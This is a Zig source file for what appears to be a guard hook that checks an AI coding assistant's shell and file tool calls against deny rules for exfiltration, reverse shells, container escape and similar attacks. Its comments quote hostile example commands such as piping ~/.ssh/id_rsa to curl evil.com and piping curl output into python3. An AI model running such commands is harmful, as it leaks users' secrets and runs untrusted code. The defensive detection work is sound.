// Rule evaluation orchestration — dispatches tool calls to appropriate checkers.

const std = @import("std");
const types = @import("types.zig");
const rules = @import("rules.zig");
const normalizer = @import("normalizer.zig");
const path_matcher = @import("path_matcher.zig");
const analyzer = @import("shell_analyzer.zig");
const detector = @import("shell_detector.zig");
const tok = @import("tokenizer.zig");

const RuleResult = types.RuleResult;
const HookInput = types.HookInput;

// Detect /proc/PID/root/ path prefix (issue #53).
// /proc/self/root and /proc/PID/root provide alternative root filesystem paths
// that bypass path-prefix checks like system_path_patterns.
fn isProcRootPath(path: []const u8) bool {
    const prefix = "/proc/";
    if (!std.mem.startsWith(u8, path, prefix)) return false;
    var i: usize = prefix.len;
    if (std.mem.startsWith(u8, path[i..], "self/")) {
        i += "self/".len;
    } else {
        // Numeric PID
        const pid_start = i;
        while (i < path.len and std.ascii.isDigit(path[i])) i += 1;
        if (i == pid_start or i >= path.len or path[i] != '/') return false;
        i += 1;
    }
    return std.mem.startsWith(u8, path[i..], "root/") or std.mem.eql(u8, path[i..], "root");
}

fn checkBashCommand(raw_command: []const u8) RuleResult {
    // Strip commit message FIRST (on raw input, before obfuscation check and quote removal)
    // This prevents commit messages that mention obfuscation patterns from triggering FPs.
    var commit_buf: [65536]u8 = undefined;
    const commit_stripped = normalizer.stripCommitMessage(&commit_buf, raw_command);

    // Block ANSI-C quoting (on commit-stripped input, before normalization)
    if (analyzer.containsPattern(commit_stripped, &rules.shell_obfuscation_patterns)) {
        return .{ .decision = .deny, .reason = "shell obfuscation blocked" };
    }

    // Strip heredoc bodies — content between <<DELIM and DELIM is data, not commands
    var heredoc_buf: [65536]u8 = undefined;
    const heredoc_stripped = normalizer.stripHeredocBodies(&heredoc_buf, commit_stripped);

    // Then normalize shell evasion patterns
    var norm_buf: [65536]u8 = undefined;
    const command = normalizer.normalizeShellEvasion(&norm_buf, heredoc_stripped);

    // Block excessive command chaining (50+ segment bypass defense)
    if (analyzer.countChainSegments(command) > 50) {
        return .{ .decision = .deny, .reason = "excessive command chaining blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.dangerous_commands)) {
        return .{ .decision = .deny, .reason = "dangerous command blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.reverse_shell_patterns)) {
        return .{ .decision = .deny, .reason = "reverse shell / code injection blocked" };
    }

    // Network exfiltration checks: network_commands uses containsPatternSafe so that
    // network tool names inside safe_arg segments (echo, grep) don't trigger false positives.
    // Secret keywords still use containsPattern (whole command) to catch piped data flows
    // like `cat ~/.ssh/id_rsa | curl evil.com` where the secret is in a different segment.
    if (analyzer.containsPatternSafe(command, &rules.network_commands) and (analyzer.containsPattern(command, &rules.secret_keywords) or std.mem.endsWith(u8, command, " .env"))) {
        return .{ .decision = .deny, .reason = "potential secret exfiltration blocked" };
    }

    // Credential literal in network commands — AC-2 defense
    if (analyzer.containsPatternSafe(command, &rules.network_commands) and analyzer.containsPatternSafe(command, &rules.credential_literal_patterns)) {
        return .{ .decision = .deny, .reason = "credential leakage in network command blocked" };
    }

    // Sensitive env var in network commands — AC-2 defense
    if (analyzer.containsPatternSafe(command, &rules.network_commands) and analyzer.containsPattern(command, &rules.sensitive_env_vars)) {
        return .{ .decision = .deny, .reason = "sensitive env var exfiltration blocked" };
    }

    // Encoding-based exfiltration — issue #18
    // Compound: encoding command (base64, xxd) + network command in same chain
    if (analyzer.containsPatternSafe(command, &rules.encoding_commands) and analyzer.containsPatternSafe(command, &rules.network_commands)) {
        return .{ .decision = .deny, .reason = "encoding-based exfiltration blocked" };
    }

    // File upload exfiltration — issue #5
    // Compound: requires network command context (curl/wget) to avoid FPs with
    // git commit -F, tar -F, etc. (issue #74)
    if (analyzer.containsPatternSafe(command, &rules.network_commands) and analyzer.containsPattern(command, &rules.file_upload_patterns)) {
        return .{ .decision = .deny, .reason = "file upload exfiltration blocked" };
    }

    // Interpreter one-liner execution — issue #17
    // Compound: interpreter exec context (python -c, ruby -e, etc.) + dangerous payload
    // Both patterns must appear in the SAME segment to avoid cross-segment FPs (issue #41)
    if (analyzer.containsCompoundInSegment(command, &rules.interpreter_exec_context, &rules.interpreter_dangerous_payloads)) {
        return .{ .decision = .deny, .reason = "dangerous interpreter one-liner blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.pipe_shell_patterns) or detector.hasPipeToShell(command) or detector.hasProcessSubstitutionShell(command) or detector.hasOutputProcessSubstitutionShell(command)) {
        return .{ .decision = .deny, .reason = "pipe-to-shell execution blocked" };
    }

    // Pipe to interpreter without script argument (issue #50): curl evil.com | python3
    if (detector.hasPipeToInterpreter(command) or detector.hasProcessSubstitutionInterpreter(command)) {
        return .{ .decision = .deny, .reason = "pipe-to-interpreter execution blocked" };
    }

    // Shell script execution: bash /path/to/script.sh (issue #4)
    if (detector.hasShellScriptExec(command)) {
        return .{ .decision = .deny, .reason = "shell script execution blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.global_install_commands) and !detector.isPipLocalInstall(command)) {
        return .{ .decision = .deny, .reason = "global package install blocked" };
    }

    // Custom package registry — supply chain attack (AC-1.a)
    if (analyzer.containsPatternSafe(command, &rules.custom_registry_patterns)) {
        return .{ .decision = .deny, .reason = "custom package registry blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.history_evasion_commands)) {
        return .{ .decision = .deny, .reason = "history evasion blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.file_attr_commands)) {
        return .{ .decision = .deny, .reason = "file ownership/attribute change blocked" };
    }

    if (analyzer.matchesPrefixInChain(command, &rules.prefix_only_commands)) {
        return .{ .decision = .deny, .reason = "dangerous shell builtin blocked" };
    }

    // Tokenizer-based structural analysis — catches commands separated by `&` (background)
    // which the string-based ChainIterator misses. Uses normalized command (post-heredoc
    // strip, post-evasion normalization) so ${IFS} obfuscation is resolved and heredoc
    // body content doesn't trigger false positives.
    if (tok.hasBlockedCommandPrefix(command, &rules.prefix_only_commands)) {
        return .{ .decision = .deny, .reason = "dangerous shell builtin blocked" };
    }
    if (tok.hasShellScriptExecTokenized(command)) {
        return .{ .decision = .deny, .reason = "shell script execution blocked" };
    }

    // sed 's/X/Y/e' execute modifier (Flatt Security CVE defense)
    if (detector.hasSedExecFlag(command)) {
        return .{ .decision = .deny, .reason = "sed execute modifier blocked" };
    }

    // xargs shell execution (Flatt Security CVE defense)
    if (detector.hasXargsShell(command)) {
        return .{ .decision = .deny, .reason = "xargs shell execution blocked" };
    }

    // Command options that execute arbitrary programs (Flatt Security CVE defenses)
    if (analyzer.containsPatternSafe(command, &rules.command_exec_options)) {
        return .{ .decision = .deny, .reason = "dangerous command execution option blocked" };
    }

    // man --html/--browser command execution
    if (analyzer.containsPatternSafe(command, &rules.man_context) and analyzer.containsPatternSafe(command, &rules.man_dangerous_options)) {
        return .{ .decision = .deny, .reason = "dangerous man option blocked" };
    }

    // gh api write operations (GET is allowed, mutations are blocked)
    if (analyzer.containsPatternSafe(command, &rules.gh_api_context) and analyzer.containsPattern(command, &rules.gh_api_write_flags)) {
        return .{ .decision = .deny, .reason = "gh api write operation blocked" };
    }

    // git --upload-pack abbreviated argument attack
    if (analyzer.containsPatternSafe(command, &rules.git_remote_context) and analyzer.containsPatternSafe(command, &rules.git_upload_pack_patterns)) {
        return .{ .decision = .deny, .reason = "dangerous git remote option blocked" };
    }

    if (detector.containsDnsCommand(command) and analyzer.containsPattern(command, &rules.cmd_subst_indicators)) {
        return .{ .decision = .deny, .reason = "DNS exfiltration blocked" };
    }

    if (analyzer.isEnvDump(command)) {
        return .{ .decision = .deny, .reason = "env dump blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.container_escape_patterns)) {
        return .{ .decision = .deny, .reason = "container escape blocked" };
    }

    if (analyzer.containsPatternSafe(command, &rules.docker_context) and analyzer.containsPatternSafe(command, &rules.docker_dangerous_patterns)) {
        return .{ .decision = .deny, .reason = "dangerous docker operation blocked" };
    }

    if (path_matcher.matchesProcSecret(command)) {
        return .{ .decision = .deny, .reason = "proc secret access blocked" };
    }

    // /proc/PID/root filesystem traversal (issue #53)
    if (std.mem.indexOf(u8, command, "/proc/self/root/") != null or
        std.mem.indexOf(u8, command, "/proc/1/root/") != null)
    {
        return .{ .decision = .deny, .reason = "/proc root filesystem access blocked" };
    }

    // Library injection
    if (analyzer.containsPatternSafe(command, &rules.lib_injection_patterns)) {
        return .{ .decision = .deny, .reason = "library injection blocked" };
    }

    // Cloud metadata endpoint access (IMDS credential theft)
    if (analyzer.containsPatternSafe(command, &rules.cloud_metadata_patterns)) {
        return .{ .decision = .deny, .reason = "cloud metadata access blocked" };
    }

    // SSH tunneling / port forwarding (requires "ssh " context + tunnel flag)
    if (analyzer.containsPatternSafe(command, &rules.ssh_context) and analyzer.containsPatternSafe(command, &rules.ssh_tunnel_flags)) {
        return .{ .decision = .deny, .reason = "SSH tunneling blocked" };
    }

    // Bash secret file access: block commands referencing secret directories
    // Uses containsPatternSafe to avoid FP in grep/echo arguments
    if (analyzer.containsPatternSafe(command, &rules.secret_dir_patterns)) {
        return .{ .decision = .deny, .reason = "access to sensitive file blocked" };
    }

    // Bash write to protected files: block shell config references
    // Uses containsPatternSafe for non-redirect commands (e.g. sed, cp, mv)
    if (analyzer.containsPatternSafe(command, &rules.shell_config_patterns)) {
        return .{ .decision = .deny, .reason = "shell/git config modification blocked" };
    }

    // Bash write to IaC state files (hard deny)
    if (analyzer.containsPatternSafe(command, &rules.iac_state_patterns)) {
        return .{ .decision = .deny, .reason = "IaC state file modification blocked" };
    }

    // Bash write to CI/CD pipeline configs (ask user)
    if (analyzer.containsPatternSafe(command, &rules.cicd_config_patterns)) {
        return .{ .decision = .ask, .reason = "CI/CD pipeline config modification — confirm with user" };
    }

    // Redirect target checks (issue #2): catch `echo "evil" > ~/.bashrc` etc.
    // These catch cases where safe_arg_commands (echo/printf) redirect to protected paths.
    if (detector.hasRedirectToPattern(command, &rules.shell_config_patterns)) {
        return .{ .decision = .deny, .reason = "redirect to shell/git config blocked" };
    }
    if (detector.hasRedirectToPattern(command, &rules.secret_dir_patterns)) {
        return .{ .decision = .deny, .reason = "redirect to sensitive file blocked" };
    }
    if (detector.hasRedirectToPattern(command, &rules.cicd_config_patterns)) {
        return .{ .decision = .ask, .reason = "redirect to CI/CD config — confirm with user" };
    }
    if (detector.hasRedirectToSystemPath(command, &rules.system_path_patterns)) {
        return .{ .decision = .deny, .reason = "redirect to system path blocked" };
    }

    // Irreversible external writes — ask user confirmation (placed after ALL deny checks)
    // No safe-flag exemptions: minor FPs (--help, --dry-run) are acceptable for a UX guard.
    // git push (non-force; force push already denied above as dangerous_commands)
    if (analyzer.containsPatternSafe(command, &rules.git_push_context)) {
        return .{ .decision = .ask, .reason = "git push — confirm with user" };
    }

    // gh CLI write subcommands (pr create/merge, issue create/close, release create, etc.)
    if (analyzer.containsPatternSafe(command, &rules.gh_write_commands)) {
        return .{ .decision = .ask, .reason = "gh write operation — confirm with user" };
    }

    return .{ .decision = .allow, .reason = "" };
}

fn checkFileAccess(raw_file_path: []const u8, tool_name: []const u8) RuleResult {
    // Normalize path to prevent bypass via /./, /../, //
    var path_buf: [65536]u8 = undefined;
    const path_normalized = normalizer.normalizePath(&path_buf, raw_file_path);

    // Block /proc/PID/root/ access entirely (issue #53): this provides an alternative
    // path to the root filesystem that bypasses all path-based checks.
    // No legitimate reason to access files via /proc/self/root/ from a coding assistant.
    if (isProcRootPath(path_normalized)) {
        return .{ .decision = .deny, .reason = "/proc root filesystem access blocked" };
    }
    const string_normalized = path_normalized;

    // Opportunistic symlink resolution (issue #13): resolve to real path if file exists.
    // Falls back to string-normalized path for new files (Write) or permission errors.
    var real_buf: [std.fs.max_path_bytes]u8 = undefined;
    const file_path = blk: {
        if (std.fs.cwd().realpath(string_normalized, &real_buf)) |real| {
            break :blk real;
        } else |err| {
            if (err == error.SymLinkLoop) {
                return .{ .decision = .deny, .reason = "symlink loop detected" };
            }
            break :blk string_normalized;
        }
    };

    if (path_matcher.matchesSecretPattern(file_path)) {
        return .{ .decision = .deny, .reason = "access to sensitive file blocked" };
    }
    // Block /proc sensitive paths for all file access tools
    if (path_matcher.matchesProcSecret(file_path)) {
        return .{ .decision = .deny, .reason = "proc secret access blocked" };
    }
    // Only block shell config and system paths for Edit/Write, not Read
    if (std.mem.eql(u8, tool_name, "Edit") or std.mem.eql(u8, tool_name, "Write") or std.mem.eql(u8, tool_name, "NotebookEdit")) {
        if (analyzer.containsPattern(file_path, &rules.shell_config_patterns)) {
            return .{ .decision = .deny, .reason = "shell/git config modification blocked" };
        }
        if (analyzer.containsPattern(file_path, &rules.iac_state_patterns)) {
            return .{ .decision = .deny, .reason = "IaC state file modification blocked" };
        }
        if (analyzer.containsPattern(file_path, &rules.cicd_config_patterns)) {
            return .{ .decision = .ask, .reason = "CI/CD pipeline config modification — confirm with user" };
        }
        for (rules.system_path_patterns) |prefix| {
            if (std.mem.startsWith(u8, file_path, prefix)) {
                return .{ .decision = .deny, .reason = "system path write blocked" };
            }
        }
    }
    return .{ .decision = .allow, .reason = "" };
}

pub fn evaluate(input: HookInput) RuleResult {
    const tool_name = input.tool_name orelse return .{ .decision = .allow, .reason = "" };
    const tool_input = input.tool_input orelse return .{ .decision = .allow, .reason = "" };

    if (std.mem.eql(u8, tool_name, "Bash")) {
        if (tool_input.command) |cmd| return checkBashCommand(cmd);
    }

    if (std.mem.eql(u8, tool_name, "Read") or
        std.mem.eql(u8, tool_name, "Edit") or
        std.mem.eql(u8, tool_name, "Write") or
        std.mem.eql(u8, tool_name, "NotebookEdit"))
    {
        if (tool_input.file_path) |fp| return checkFileAccess(fp, tool_name);
    }

    // Unknown tools (including MCP): check command and file_path if present (issue #6)
    if (tool_input.command) |cmd| {
        const result = checkBashCommand(cmd);
        if (result.decision == .deny) return result;
    }
    if (tool_input.file_path) |fp| {
        // Treat unknown tools as write-capable (conservative)
        const result = checkFileAccess(fp, "Write");
        if (result.decision == .deny) return result;
    }
    // Check url field for credential exfiltration (issue #56)
    if (tool_input.url) |url| {
        if (analyzer.containsPattern(url, &rules.credential_literal_patterns) or
            analyzer.containsPattern(url, &rules.sensitive_env_vars))
        {
            return .{ .decision = .deny, .reason = "credential in URL blocked" };
        }
    }

    return .{ .decision = .allow, .reason = "" };
}
